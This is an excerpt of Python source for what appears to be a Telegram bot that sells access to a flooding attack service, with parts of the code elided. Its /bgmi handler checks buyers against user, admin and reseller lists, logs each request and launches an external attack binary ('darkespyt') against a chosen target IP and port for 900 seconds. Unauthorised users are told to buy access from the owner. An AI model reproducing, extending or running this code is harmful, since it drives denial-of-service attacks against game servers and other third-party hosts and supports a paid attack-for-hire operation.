...
def initialize_bot(bot, bot_id):
    ...
    def start_attack_reply(message, target, port, key, owner_name):
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        chat_id = message.chat.id
        global Attack
        full_command = ['./darkespyt_x86_64_vps_codespace', str(target), str(port), '900', str(key)]
    ...
    def handle_bgmi(message):
        ...
        if user_id in allowed_user_ids or user_id in allowed_admin_ids or user_id in allowed_resellers_ids:
            ...
            if len(command) == 4:
                ...
                port = int(command[2])
                key = str(command[3])
                log_command(user_id, target, port, key, '/bgmi')
                start_attack_reply(message, target, port, key, owner_name)  
            else:
                response = "✅ Usage :- /bgmi <target> <port> <key>"
                bot.reply_to(message, response)
        else:
            response = f"You Are Not Authorized To Use This Command.\n\nKindly Contact Admin to purchase the Access : {owner_name}."
            bot.reply_to(message, response)
